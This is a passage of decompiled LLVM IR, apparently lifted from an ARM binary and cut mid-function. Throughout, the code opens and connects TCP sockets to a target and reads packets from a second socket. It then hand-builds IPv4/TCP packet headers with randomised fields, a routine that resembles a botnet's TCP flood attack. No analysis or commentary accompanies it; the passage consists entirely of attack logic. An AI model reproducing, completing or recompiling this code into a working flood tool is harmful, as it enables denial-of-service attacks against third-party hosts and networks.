  br i1 %v7_ad54, label %dec_label_pc_af44, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad7c = call i32 @__GI_setsockopt(i32 %v3_ad50, i32 0, i32 3, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad7c, i32* %r0.global-to-local, align 4
  %v7_ad80 = icmp eq i32 %v5_ad7c, -1
  store i1 %v7_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad80, label %dec_label_pc_af3c, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad60
  %v0_ad88 = load i32, i32* @r7, align 4
  %v3_ad88 = mul i32 %v0_ad88, 65536
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad90 = load i32, i32* @r6, align 4
  %v2_ad90 = icmp eq i32 %v0_ad90, 0
  store i1 %v2_ad90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad98 = urem i32 %v0_ad88, 65536
  store i32 %v3_ad98, i32* @fp, align 4
  br i1 %v2_ad90, label %dec_label_pc_b1c8, label %dec_label_pc_ada0.preheader

dec_label_pc_ada0.preheader:                      ; preds = %dec_label_pc_ad88
  %v2_adec = ptrtoint i32* %stack_var_-144 to i32
  %v2_ae30 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae68 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae74 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae78 = ptrtoint i32* %stack_var_-48 to i32
  %v4_aed8 = zext i8 %tmp to i32
  %v1_aedc = and i32 %v4_aed8, 18
  %v2_aee0 = icmp eq i32 %v1_aedc, 18
  %v4_b084 = sext i8 %v5_abe0 to i32
  %sext = mul i32 %v5_abfc, 16777216
  %v4_b094 = sdiv i32 %sext, 16777216
  %v3_aec4 = sext i16 %tmp61 to i32
  %v1_aee8 = and i32 %v4_aed8, 5
  %v2_aee8 = icmp eq i32 %v1_aee8, 0
  %v4_ae28 = add i32 %v2_adec, 82
  %v5_ae28 = inttoptr i32 %v4_ae28 to i16*
  %v1_b018 = add i32 %v6_ad1c, 40
  %v1_b12c = urem i32 %v5_ac5c, 2
  %tmp97 = sub nsw i32 0, %v1_b12c
  %v4_b134 = and i32 %tmp97, 32
  %v1_b144 = urem i32 %v6_ac7c, 2
  %tmp98 = sub nsw i32 0, %v1_b144
  %v4_b14c = and i32 %tmp98, 16
  %v1_b15c = urem i32 %v6_ac9c, 2
  %tmp99 = sub nsw i32 0, %v1_b15c
  %v4_b164 = and i32 %tmp99, 8
  %v1_b174 = urem i32 %v6_acbc, 2
  %tmp100 = sub nsw i32 0, %v1_b174
  %v4_b17c = and i32 %tmp100, 4
  %v1_b18c = urem i32 %v6_acdc, 2
  %tmp101 = sub nsw i32 0, %v1_b18c
  %v3_b194 = and i32 %tmp101, 2
  %v1_b1a4 = urem i32 %v6_acfc, 2
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ada0.preheader, %dec_label_pc_af14
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_af14 ], [ %tmp34, %dec_label_pc_ada0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_af14 ], [ %tmp37, %dec_label_pc_ada0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_adac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_adac, i32* %r0.global-to-local, align 4
  %v7_adb0 = icmp eq i32 %v3_adac, -1
  store i1 %v7_adb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_adac, i32* @r5, align 4
  br i1 %v7_adb0, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_adbc:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_aef0
  %v0_adc4 = phi i32 [ %v3_af04, %dec_label_pc_aef0 ], [ %v3_adac, %dec_label_pc_ada0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aef0 ], [ %stack_var_-62.0, %dec_label_pc_ada0 ]
  %stack_var_-60.1 = phi i32 [ %v0_afc4, %dec_label_pc_aef0 ], [ %stack_var_-60.0, %dec_label_pc_ada0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_adc4 = call i32 @__libc_fcntl(i32 %v0_adc4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_adcc = or i32 %v2_adc4, 2048
  store i32 %v1_adcc, i32* @r2, align 4
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r0.global-to-local, align 4
  %v2_add4 = call i32 @__libc_fcntl(i32 %v0_add0, i32 4)
  %v3_add8 = load i32, i32* %stack_var_-44, align 4
  %v5_ade0 = mul i32 %v3_add8, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adf4 = add i32 %v5_ade0, %arg2
  store i32 %v2_adf4, i32* %r3.global-to-local, align 4
  %v1_adf8 = add i32 %v2_adf4, 20
  %v2_adf8 = inttoptr i32 %v1_adf8 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r2.global-to-local, align 4
  %v2_adfc = icmp ugt i8 %v3_adf8, 30
  %v7_adfc = icmp eq i8 %v3_adf8, 31
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ae00 = xor i1 %v7_adfc, true
  %v3_ae00 = and i1 %v2_adfc, %v2_ae00
  br i1 %v3_ae00, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_adbc
  %v5_ae00 = add i32 %v2_adf4, 16
  %v6_ae00 = inttoptr i32 %v5_ae00 to i32*
  %v7_ae00 = load i32, i32* %v6_ae00, align 4
  store i32 %v7_ae00, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_adbc, %bb
  %v4_ae04 = phi i32 [ %v2_adf4, %dec_label_pc_adbc ], [ %v7_ae00, %bb ]
  %v4_ae04.stack_var_-60.1 = select i1 %v3_ae00, i32 %v4_ae04, i32 %stack_var_-60.1
  %v2_ae08 = xor i1 %v2_adfc, true
  %v3_ae08 = or i1 %v7_adfc, %v2_ae08
  br i1 %v3_ae08, label %dec_label_pc_af50, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %bb71, %dec_label_pc_af50
  %v0_afc4 = phi i32 [ %v5_afa0, %dec_label_pc_af50 ], [ %v4_ae04.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v9_ae14 = icmp eq i32 %v0_ae14, 65535
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae14, label %dec_label_pc_afac, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ae0c
  %v4_ae18 = udiv i32 %v0_ae14, 256
  %v2_ae1c = urem i32 %v0_ae14, 256
  store i32 %v2_ae1c, i32* %r2.global-to-local, align 4
  %v5_ae20 = mul nuw nsw i32 %v2_ae1c, 256
  %v6_ae20 = or i32 %v5_ae20, %v4_ae18
  store i32 %v6_ae20, i32* %r3.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  %v2_ae28 = trunc i32 %v6_ae20 to i16
  store i16 %v2_ae28, i16* %v5_ae28, align 2
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %.thread9, %dec_label_pc_afac
  %stack_var_-62.2 = phi i16 [ %v1_afac, %dec_label_pc_afac ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_ae30, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ae38 = load i32, i32* @r5, align 4
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  %v3_ae3c = call i32 @__libc_connect(i32 %v0_ae38, i32 %v2_ae30, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae44 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae44, i32* %r0.global-to-local, align 4
  store i32 %v2_ae44, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %tmp35, %v0_afc4
  %v4_aecc = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_aea4 to i32
  %v9_aeb8 = icmp eq i1 %v9_aea4, false
  %v9_aed0 = icmp eq i32 %v3_aec4, %v4_aecc
  br label %dec_label_pc_ae60

dec_label_pc_ae50:                                ; preds = %.thread, %dec_label_pc_aec0, %dec_label_pc_aee8, %bb75
  %v2_ae50 = call i32 @__GI_time(i32* null)
  %v0_ae54 = load i32, i32* @r4, align 4
  %v2_ae54 = sub i32 %v2_ae50, %v0_ae54
  store i32 %v2_ae54, i32* %r0.global-to-local, align 4
  %v7_ae58 = icmp eq i32 %v2_ae54, 10
  store i1 %v7_ae58, i1* %cpsr_z.global-to-local, align 1
  %v8_ae5c = icmp sgt i32 %v2_ae54, 10
  br i1 %v8_ae5c, label %dec_label_pc_aef0, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae30
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae74, i32* %r1.global-to-local, align 4
  store i32 %v2_ae78, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae80 = load i32, i32* @sb, align 4
  store i32 %v0_ae80, i32* %r0.global-to-local, align 4
  %v6_ae88 = call i32 @__libc_recvfrom(i32 %v0_ae80, i32 %v2_ae74, i32 256, i32 16384, i32 %v2_ae68, i32 %v2_ae78)
  store i32 %v6_ae88, i32* %r2.global-to-local, align 4
  %v7_ae90 = icmp eq i32 %v6_ae88, -1
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae90, label %dec_label_pc_af44, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae60
  store i32 %v0_afc4, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_aeb0 = icmp eq i32 %v6_ae88, 40
  store i1 %v7_aeb0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae88, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae9c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae50

bb75:                                             ; preds = %dec_label_pc_ae9c
  store i1 %v9_aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb8, label %dec_label_pc_ae50, label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %bb75
  store i32 %v3_aec4, i32* @lr, align 4
  store i32 %v2_adec, i32* @r3, align 4
  store i32 %v4_aecc, i32* %r2.global-to-local, align 4
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aed0, label %dec_label_pc_aed8, label %dec_label_pc_ae50

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aec0
  store i32 %v4_aed8, i32* %r2.global-to-local, align 4
  store i32 %v1_aedc, i32* @r3, align 4
  store i1 %v2_aee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee0, label %dec_label_pc_afbc, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed8
  store i1 %v2_aee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee8, label %dec_label_pc_ae50, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_ae50
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r0.global-to-local, align 4
  %v1_aef4 = call i32 @__GI___libc_close(i32 %v0_aef0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_af04 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  %v3_af08 = icmp eq i32 %v3_af04, -1
  %v8_af08 = icmp eq i32 %v3_af04, -1
  store i1 %v8_af08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_af04, i32* @r5, align 4
  br i1 %v3_af08, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_af14:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ada0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ada0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aef0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ada0 ], [ %v0_afc4, %bb82 ], [ %v0_afc4, %dec_label_pc_aef0 ]
  %v3_af14 = load i32, i32* %stack_var_-44, align 4
  %v1_af18 = add i32 %v3_af14, 1
  store i32 %v1_af18, i32* @r3, align 4
  %v1_af1c = load i32, i32* @r6, align 4
  %v9_af1c = icmp eq i32 %v1_af18, %v1_af1c
  store i1 %v9_af1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af18, i32* %stack_var_-44, align 4
  %v5_af24 = icmp slt i32 %v1_af18, %v1_af1c
  br i1 %v5_af24, label %dec_label_pc_ada0, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af14
  store i32 %v6_ad1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1d8

dec_label_pc_af3c:                                ; preds = %dec_label_pc_ad60
  %v0_af3c = load i32, i32* @sb, align 4
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  %v1_af40 = call i32 @__GI___libc_close(i32 %v0_af3c)
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_ae60, %entry, %dec_label_pc_af3c
  %v1_af4c = phi i32 [ %v3_ad50, %entry ], [ %v1_af40, %dec_label_pc_af3c ], [ 0, %dec_label_pc_ae60 ]
  store i32 %v27_ab7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af4c

dec_label_pc_af50:                                ; preds = %bb71
  %v1_af50 = add i32 %v4_ae04, 16
  %v2_af50 = inttoptr i32 %v1_af50 to i32*
  %v3_af50 = load i32, i32* %v2_af50, align 4
  store i32 %v3_af50, i32* @r4, align 4
  %v0_af54 = call i32 @rand_next()
  store i32 %v0_af54, i32* %r0.global-to-local, align 4
  %v3_af58 = load i32, i32* %stack_var_-44, align 4
  %v5_af60 = mul i32 %v3_af58, 24
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = and i32 %v0_af68, 16711680
  store i32 %v1_af68, i32* %ip.global-to-local, align 4
  %v3_af6c = udiv i32 %v0_af68, 16777216
  %v2_af70 = add i32 %v5_af60, %arg2
  store i32 %v2_af70, i32* %r1.global-to-local, align 4
  %v4_af74 = udiv i32 %v1_af68, 256
  %v5_af74 = or i32 %v4_af74, %v3_af6c
  store i32 %v5_af74, i32* %r2.global-to-local, align 4
  %v1_af78 = and i32 %v0_af68, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_af78, i32* %r3.global-to-local, align 4
  %v1_af7c = add i32 %v2_af70, 20
  %v2_af7c = inttoptr i32 %v1_af7c to i8*
  %v3_af7c = load i8, i8* %v2_af7c, align 1
  %v4_af7c = zext i8 %v3_af7c to i32
  store i32 %v4_af7c, i32* %ip.global-to-local, align 4
  %v4_af80 = mul i32 %v1_af78, 256
  %v4_af84 = mul i32 %v0_af68, 16777216
  %v5_af80 = or i32 %v4_af80, %v4_af84
  %v5_af84 = or i32 %v5_af80, %v5_af74
  %v7_af88 = lshr i32 %v0_af54, %v4_af7c
  %v8_af88 = add i32 %v7_af88, %v5_af84
  store i32 %v8_af88, i32* %r2.global-to-local, align 4
  %v1_af8c = and i32 %v8_af88, 16711680
  store i32 %v1_af8c, i32* %r0.global-to-local, align 4
  %v1_af98 = and i32 %v8_af88, 65280
  store i32 %v1_af98, i32* %r1.global-to-local, align 4
  %v5_afa0 = call i32 @llvm.bswap.i32(i32 %v8_af88)
  store i32 %v5_afa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_afac:                                ; preds = %dec_label_pc_ae0c
  %v0_afac = call i32 @rand_next()
  %v1_afac = trunc i32 %v0_afac to i16
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  store i32 %v2_adec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_afbc:                                ; preds = %dec_label_pc_aed8
  %v3_afbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afbc, i32* @r4, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v5_afc4 = mul i32 %v3_afbc, 16
  %v6_afc4 = add i32 %v5_afc4, %v2_ab98
  %v7_afc4 = inttoptr i32 %v6_afc4 to i32*
  store i32 %v0_afc4, i32* %v7_afc4, align 4
  %v0_afc8 = load i32, i32* @r8, align 4
  %v1_afc8 = add i32 %v0_afc8, 4
  %v2_afc8 = inttoptr i32 %v1_afc8 to i32*
  %v3_afc8 = load i32, i32* %v2_afc8, align 4
  store i32 %v3_afc8, i32* %r1.global-to-local, align 4
  %v3_afd0 = udiv i32 %v3_afc8, 16777216
  %v1_afd4 = and i32 %v3_afc8, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v1_afcc = udiv i32 %v3_afc8, 256
  %v4_afd8 = and i32 %v1_afcc, 65280
  store i32 %v2_ab98, i32* %r0.global-to-local, align 4
  %v4_afe0 = mul i32 %v1_afd4, 256
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe4 = mul i32 %v0_afe4, 16
  %v2_afe8 = add i32 %v3_afe4, %v2_ab98
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  %v4_afec = mul i32 %v3_afc8, 16777216
  %v5_afd8 = or i32 %v4_afec, %v3_afd0
  %v5_afe0 = or i32 %v5_afd8, %v4_afd8
  %v5_afec = or i32 %v5_afe0, %v4_afe0
  store i32 %v5_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v2_afe8, 4
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 %v5_afec, i32* %v3_aff0, align 4
  %v0_aff4 = load i32, i32* @r8, align 4
  %v1_aff4 = add i32 %v0_aff4, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
  store i32 %v3_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = and i32 %v3_aff4, 16711680
  store i32 %v1_aff8, i32* %r0.global-to-local, align 4
  %v3_affc = udiv i32 %v3_aff4, 16777216
  %v1_b000 = and i32 %v3_aff4, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v4_b004 = udiv i32 %v1_aff8, 256
  %v4_b008 = mul i32 %v1_b000, 256
  store i32 %v6_ad1c, i32* %r2.global-to-local, align 4
  %v4_b010 = mul i32 %v3_aff4, 16777216
  %v5_b004 = or i32 %v4_b010, %v3_affc
  %v5_b008 = or i32 %v5_b004, %v4_b004
  %v5_b010 = or i32 %v5_b008, %v4_b008
  store i32 %v5_b010, i32* %r3.global-to-local, align 4
  %v1_b014 = add i32 %v0_aff4, 2
  %v2_b014 = inttoptr i32 %v1_b014 to i16*
  %v3_b014 = load i16, i16* %v2_b014, align 2
  %v4_b014 = zext i16 %v3_b014 to i32
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  store i32 %v1_b018, i32* @r7, align 4
  %v0_b01c = load i32, i32* @lr, align 4
  %v1_b01c = trunc i32 %v0_b01c to i16
  %v2_b01c = load i32, i32* %ip.global-to-local, align 4
  %v3_b01c = add i32 %v2_b01c, 14
  %v4_b01c = inttoptr i32 %v3_b01c to i16*
  store i16 %v1_b01c, i16* %v4_b01c, align 2
  %v0_b020 = load i32, i32* %r1.global-to-local, align 4
  %v1_b020 = trunc i32 %v0_b020 to i16
  %v2_b020 = load i32, i32* %ip.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 12
  %v4_b020 = inttoptr i32 %v3_b020 to i16*
  store i16 %v1_b020, i16* %v4_b020, align 2
  %v0_b024 = load i32, i32* %r3.global-to-local, align 4
  %v1_b024 = load i32, i32* %ip.global-to-local, align 4
  %v2_b024 = add i32 %v1_b024, 8
  %v3_b024 = inttoptr i32 %v2_b024 to i32*
  store i32 %v0_b024, i32* %v3_b024, align 4
  %v0_b028 = load i32, i32* @r7, align 4
  store i32 %v0_b028, i32* @r0, align 4
  %v0_b02c = call i32 @malloc()
  store i32 %v0_b02c, i32* %r0.global-to-local, align 4
  store i32 %v2_aba8, i32* %r3.global-to-local, align 4
  %v2_b038 = load i32, i32* @r4, align 4
  %v5_b038 = mul i32 %v2_b038, 4
  %v6_b038 = add i32 %v5_b038, %v2_aba8
  %v7_b038 = inttoptr i32 %v6_b038 to i32*
  store i32 %v0_b02c, i32* %v7_b038, align 4
  %v3_b03c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b03c, i32* %r2.global-to-local, align 4
  %v0_b040 = load i32, i32* %r3.global-to-local, align 4
  %v4_b040 = mul i32 %v3_b03c, 4
  %v5_b040 = add i32 %v0_b040, %v4_b040
  %v6_b040 = inttoptr i32 %v5_b040 to i32*
  %v7_b040 = load i32, i32* %v6_b040, align 4
  store i32 %v7_b040, i32* @r4, align 4
  %v1_b044 = inttoptr i32 %v7_b040 to i8*
  %v2_b044 = load i8, i8* %v1_b044, align 1
  %tmp103 = urem i8 %v2_b044, 16
  %v1_b048 = zext i8 %tmp103 to i32
  %v1_b04c = or i32 %v1_b048, 64
  store i32 %v1_b04c, i32* %r3.global-to-local, align 4
  %v1_b050 = trunc i32 %v1_b04c to i8
  store i8 %v1_b050, i8* %v1_b044, align 1
  %v0_b054 = load i32, i32* @r4, align 4
  %v1_b054 = inttoptr i32 %v0_b054 to i8*
  %v2_b054 = load i8, i8* %v1_b054, align 1
  %v0_b058 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b058, 256
  %v1_b060 = and i8 %v2_b054, -16
  %v1_b064 = or i8 %v1_b060, 5
  %v1_b068 = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp78 = udiv i32 %v0_b058, 256
  %v4_b06c = urem i32 %tmp78, 256
  %v5_b06c = or i32 %v4_b06c, %v1_b068
  store i32 %v5_b06c, i32* %r2.global-to-local, align 4
  %v0_b070 = load i32, i32* @fp, align 4
  %v1_b070 = urem i32 %v0_b070, 256
  store i32 %v1_b070, i32* %r0.global-to-local, align 4
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  %v3_b078 = udiv i32 %v0_b070, 256
  store i32 %v3_b078, i32* %r1.global-to-local, align 4
  store i8 %v1_b064, i8* %v1_b054, align 1
  %v0_b080 = load i32, i32* %r1.global-to-local, align 4
  %v1_b080 = load i32, i32* %r0.global-to-local, align 4
  %v4_b080 = mul i32 %v1_b080, 256
  %v5_b080 = or i32 %v4_b080, %v0_b080
  store i32 %v5_b080, i32* %r1.global-to-local, align 4
  store i32 %v4_b084, i32* %r0.global-to-local, align 4
  %v2_b088 = load i32, i32* @r4, align 4
  %v3_b088 = add i32 %v2_b088, 1
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v5_abe0, i8* %v4_b088, align 1
  %v0_b08c = load i32, i32* %r1.global-to-local, align 4
  %v1_b08c = trunc i32 %v0_b08c to i16
  %v2_b08c = load i32, i32* @r4, align 4
  %v3_b08c = add i32 %v2_b08c, 4
  %v4_b08c = inttoptr i32 %v3_b08c to i16*
  store i16 %v1_b08c, i16* %v4_b08c, align 2
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v0_b090, 0
  store i1 %v2_b090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b094, i32* %r1.global-to-local, align 4
  %v0_b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r4, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b090, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_afbc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_afbc, %bb79
  %v0_b0a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* @r4, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 8
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r4, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 9
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v4_b0a8, align 1
  %v0_b0ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ac, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  %v3_b0ac = load i32, i32* @r4, align 4
  %v4_b0ac = add i32 %v3_b0ac, 6
  %v5_b0ac = inttoptr i32 %v4_b0ac to i16*
  store i16 %v2_b0ac, i16* %v5_b0ac, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b0b4 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_b0b4, i32* %r1.global-to-local, align 4
  %v1_b0b8 = load i32, i32* @r4, align 4
  %v2_b0b8 = add i32 %v1_b0b8, 12
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v2_b0b4, i32* %v3_b0b8, align 4
  %v3_b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b0bc, i32* %r3.global-to-local, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v4_b0c4 = mul i32 %v3_b0bc, 16
  %v5_b0c4 = add i32 %v4_b0c4, %v2_ab98
  %v6_b0c4 = inttoptr i32 %v5_b0c4 to i32*
  %v7_b0c4 = load i32, i32* %v6_b0c4, align 4
  store i32 %v7_b0c4, i32* %r2.global-to-local, align 4
  store i32 %v5_b0c4, i32* %r3.global-to-local, align 4
  %v1_b0d0 = load i32, i32* @r4, align 4
  %v2_b0d0 = add i32 %v1_b0d0, 16
  %v3_b0d0 = inttoptr i32 %v2_b0d0 to i32*
  store i32 %v7_b0c4, i32* %v3_b0d0, align 4
  %v0_b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 12
  %v2_b0d4 = inttoptr i32 %v1_b0d4 to i16*
  %v3_b0d4 = load i16, i16* %v2_b0d4, align 2
  %v4_b0d4 = zext i16 %v3_b0d4 to i32
  store i32 %v4_b0d4, i32* %r0.global-to-local, align 4
  %v1_b0d8 = add i32 %v0_b0d4, 8
  %v2_b0d8 = inttoptr i32 %v1_b0d8 to i32*
  %v3_b0d8 = load i32, i32* %v2_b0d8, align 4
  store i32 %v3_b0d8, i32* %r1.global-to-local, align 4
  %v2_b0dc = load i32, i32* @r4, align 4
  %v3_b0dc = add i32 %v2_b0dc, 20
  %v4_b0dc = inttoptr i32 %v3_b0dc to i16*
  store i16 %v3_b0d4, i16* %v4_b0dc, align 2
  %v0_b0e0 = load i32, i32* @r4, align 4
  %v1_b0e0 = add i32 %v0_b0e0, 20
  store i32 %v1_b0e0, i32* @r8, align 4
  %v1_b0e4 = add i32 %v0_b0e0, 33
  %v2_b0e4 = inttoptr i32 %v1_b0e4 to i8*
  %v3_b0e4 = load i8, i8* %v2_b0e4, align 1
  %v4_b0e4 = zext i8 %v3_b0e4 to i32
  store i32 %v4_b0e4, i32* %r2.global-to-local, align 4
  %v0_b0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0e8 = add i32 %v0_b0e0, 24
  %v3_b0e8 = inttoptr i32 %v2_b0e8 to i32*
  store i32 %v0_b0e8, i32* %v3_b0e8, align 4
  %v0_b0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ec = or i32 %v0_b0ec, 1
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
